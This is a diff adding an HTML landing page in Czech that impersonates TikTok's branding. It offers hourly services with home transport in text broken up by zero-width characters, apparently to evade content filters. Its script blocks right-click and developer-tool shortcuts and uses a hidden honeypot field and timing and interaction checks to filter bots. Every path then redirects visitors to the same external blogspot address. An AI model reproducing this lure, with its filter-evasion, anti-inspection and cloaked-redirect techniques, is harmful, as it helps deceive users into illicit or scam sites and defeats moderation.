@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="robots" content="noindex, nofollow">
+<meta name="referrer" content="no-referrer">
+<title>Diskrétní fotografie</title>
+<script id="_wau271">var _wau = _wau || []; _wau.push(["small", "tiktok", "271"]);</script><script async src="//waust.at/s.js"></script>
+<meta content='https://i.postimg.cc/zBWGjGcb/Vista-Uno-Sepia.png' property='og:image'/>
+<link rel="stylesheet" href="https://cdn.smrt-content.com/assets/1004/css/index.css">
+<link rel="shortcut icon" href="https://cdn.jmpcdn.com/assets/3420/images/2.ico" type="image/x-icon">
+<script src="https://cdn.tailwindcss.com"></script>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+<script>
+
+tailwind.config = {
+
+theme: {
+
+extend: {
+
+colors: { 'fuchsia-tiktok': '#e736a4' },
+
+fontFamily: { sans: ['Inter', 'sans-serif'] }
+
+}
+
+}
+
+}
+</script>
+<style>
+
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.animate-spin-custom { animation: spin 1s linear infinite; }
+
+#app-container { opacity: 0; transition: opacity 0.5s; }
+
+#app-container.opacity-100 { opacity: 1; }
+
+#loading-screen { transition: opacity 0.5s; }
+
+#honeypot-container { position: absolute; top: 0; left: 0; width: 0; height: 0; overflow: hidden; opacity: 0; pointer-events: none; }
+
+.v-section { position: fixed; inset: 0; z-index: -1; overflow: hidden; }
+
+.v-grid { 
+
+    position: absolute; inset: 0; z-index: 2; pointer-events: none; 
+
+    background: linear-gradient(rgba(255,255,255,0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.1) 1px, transparent 1px);
+
+    background-size: 3px 3px;
+
+}
+
+#VideoBg { width: 100%; height: 100%; object-fit: cover; filter: blur(8px) brightness(0.8); }
+</style>
+</head>
+<body>
+<script>
+
+document.addEventListener('contextmenu', e => e.preventDefault());
+
+document.addEventListener('keydown', e => {
+
+if (e.key === 'F12' || (e.ctrlKey && (e.key === 'i' || e.key === 'I' || e.key === 'u' || e.key === 'U'))) {
+
+e.preventDefault();
+
+}
+
+});
+</script>
+<div id="loading-screen" class="fixed inset-0 bg-black flex items-center justify-center z-50">
+<p class="text-white text-xl flex items-center">
+<svg class="animate-spin-custom -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+</svg>
+
+Načítání...
+</p>
+</div>
+<div id="app-container" class="w-full h-screen flex flex-col items-center justify-center relative">
+<div id="debug-info" class="absolute top-0 left-0 text-[8px] px-0.5 py-0.25 rounded-br-lg bg-black/5 z-20">
+<p id="app-message" class="mt-0.5 font-bold"></p>
+</div>
+<div class="layer"></div>
+<div class="wrap">
+<div class="step-block">
+<div class="logo">
+<img src="https://i.postimg.cc/kXXfxHsJ/Tik-Tok-logo-svg.png" alt="Logo" class="w-20 h-20 rounded-full">
+</div>
+<div id="step-1" class="step-item" style="display: block;">
+<div class="question-title">
+
+N&#8203;a&#8203;b&#8203;í&#8203;z&#8203;í&#8203;m s&#8203;v&#8203;é s&#8203;l&#8203;u&#8203;ž&#8203;b&#8203;y n&#8203;a h&#8203;o&#8203;d&#8203;i&#8203;n&#8203;u, s d&#8203;o&#8203;p&#8203;r&#8203;a&#8203;v&#8203;o&#8203;u d&#8203;o&#8203;m&#8203;ů. C&#8203;h&#8203;c&#8203;e&#8203;t&#8203;e v&#8203;i&#8203;d&#8203;ě&#8203;t m&#8203;ů&#8203;j k&#8203;a&#8203;t&#8203;a&#8203;l&#8203;o&#8203;g??
+</div>
+<div class="buttons-block">
+<div data-next="step-2" class="step-btn no-btn tr-b-option step-trigger">Ne</div>
+<div data-next="step-2" class="step-btn yes-btn tr-b-option step-trigger">Ano</div>
+</div>
+</div>
+<div id="step-2" class="step-item thishide" style="display: none;">
+<div class="question-title">
+
+P&#8203;O&#8203;Z&#8203;N&#8203;Á&#8203;M&#8203;K&#8203;A: S&#8203;o&#8203;u&#8203;h&#8203;l&#8203;a&#8203;s&#8203;í&#8203;t&#8203;e s t&#8203;í&#8203;m, ž&#8203;e b&#8203;u&#8203;d&#8203;e&#8203;t&#8203;e r&#8203;e&#8203;s&#8203;p&#8203;e&#8203;k&#8203;t&#8203;o&#8203;v&#8203;a&#8203;t ž&#8203;e&#8203;n&#8203;y, k&#8203;t&#8203;e&#8203;r&#8203;é u&#8203;v&#8203;i&#8203;d&#8203;í&#8203;t&#8203;e n&#8203;í&#8203;ž&#8203;e? K&#8203;l&#8203;i&#8203;k&#8203;n&#8203;ě&#8203;t&#8203;e n&#8203;a „V&#8203;S&#8203;T&#8203;O&#8203;U&#8203;P&#8203;I&#8203;T“ p&#8203;r&#8203;o p&#8203;o&#8203;t&#8203;v&#8203;r&#8203;z&#8203;e&#8203;n&#8203;í s&#8203;c&#8203;h&#8203;ů&#8203;z&#8203;k&#8203;y. P&#8203;o&#8203;k&#8203;u&#8203;d n&#8203;ě&#8203;k&#8203;o&#8203;h&#8203;o z&#8203;n&#8203;á&#8203;t&#8203;e, p&#8203;r&#8203;o&#8203;s&#8203;í&#8203;m, n&#8203;e&#8203;z&#8203;v&#8203;e&#8203;ř&#8203;e&#8203;j&#8203;ň&#8203;u&#8203;j&#8203;t&#8203;e a n&#8203;e&#8203;š&#8203;i&#8203;ř&#8203;t&#8203;e f&#8203;á&#8203;m&#8203;y....
+</div>
+<div class="buttons-block">
+<button id="btn-final-action" class="step-btn submit-btn tr-submit-button text-center uppercase font-black text-xl sm:text-2xl py-4 px-8 rounded-xl transition-all duration-100 border-4 border-white shadow-xl bg-fuchsia-tiktok text-black hover:scale-[1.03] shadow-[0_8px_0_-2px_#e736a4,0_8px_0_0_#000] active:shadow-[0_4px_0_-2px_#e736a4,0_4px_0_0_#000] active:translate-y-[4px]" role="button">VSTOUPIT</button>
+</div>
+</div>
+<div class="v-section">
+<div class="v-grid"></div>
+<video autoplay muted loop playsinline id="VideoBg">
+<source src="https://cdn.videy.co/f76y2GTV1.mp4" type="video/mp4">
+</video>
+</div>
+<div id="honeypot-container" aria-hidden="true">
+<input id="hp-field" name="field_721" type="text" tabindex="-1" autocomplete="off" />
+</div>
+</div>
+</div>
+</div>
+<script>
+
+const M = 4000;
+
+const H = "https://guardartodoengaragew.blogspot.com/"; 
+
+const B = "https://guardartodoengaragew.blogspot.com/"; 
+
+let _k = false;
+
+let _d = Date.now();
+
+let _v = false;
+
+let _f = false;
+
+let _x = false;
+
+const aC = document.getElementById('app-container');
+
+const lS = document.getElementById('loading-screen');
+
+const bA = document.getElementById('btn-final-action');
+
+const hF = document.getElementById('hp-field');
+
+const s1 = document.getElementById('step-1');
+
+const s2 = document.getElementById('step-2');
+
+function nS(id) {
+
+   if (id === 'step-2') {
+
+       s1.style.display = 'none';
+
+       s2.style.display = 'block';
+
+   }
+
+}
+
+document.querySelectorAll('.step-trigger').forEach(b => {
+
+   b.addEventListener('click', (e) => {
+
+       const n = e.currentTarget.dataset.next;
+
+       if (n) nS(n);
+
+   });
+
+});
+
+function uB(t, iB = false, iL = false) {
+
+   const c = 'step-btn submit-btn tr-submit-button text-center uppercase font-black text-xl sm:text-2xl py-4 px-8 rounded-xl transition-all duration-100 border-4 border-white shadow-xl';
+
+   if (iL) {
+
+       bA.innerHTML = `<div class="flex items-center justify-center"><svg class="animate-spin-custom -ml-1 mr-3 h-5 w-5 text-black" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>${t}</div>`;
+
+       bA.className = `${c} bg-fuchsia-tiktok text-black`;
+
+   } else if (iB) {
+
+       bA.innerHTML = t;
+
+       bA.className = `${c} bg-red-600 cursor-not-allowed text-white`;
+
+   } else {
+
+       bA.innerHTML = t;
+
+       bA.className = `${c} bg-fuchsia-tiktok text-black hover:scale-[1.03] shadow-[0_8px_0_-2px_#e736a4,0_8px_0_0_#000]`;
+
+   }
+
+}
+
+function cK() {
+
+   const t = Date.now() - _d;
+
+   if (hF.value.length > 0 || t < M || !_f || !_x) {
+
+       _k = true;
+
+       uB('ERROR', true);
+
+       return true;
+
+   }
+
+   return false;
+
+}
+
+async function hE(e) {
+
+   e.preventDefault();
+
+   if (_v || _k) return;
+
+   _v = true;
+
+   uB('OVĚŘOVÁNÍ...', false, true);
+
+   const r = cK();
+
+   setTimeout(() => {
+
+       window.location.href = r ? B : H;
+
+   }, 800);
+
+}
+
+window.addEventListener('focus', () => { _f = true; }, { once: true });
+
+['mousemove', 'touchstart', 'click'].forEach(e => {
+
+   document.addEventListener(e, () => { _x = true; }, { once: true });
+
+});
+
+(function i() {
+
+   setTimeout(() => {
+
+       lS.style.opacity = '0';
+
+       setTimeout(() => {
+
+           lS.style.display = 'none';
+
+           aC.classList.add('opacity-100');
+
+           _d = Date.now();
+
+       }, 500);
+
+   }, 1000);
+
+})();
+
+bA.addEventListener('click', hE);
+</script>
+</body>
+</html>
+ 
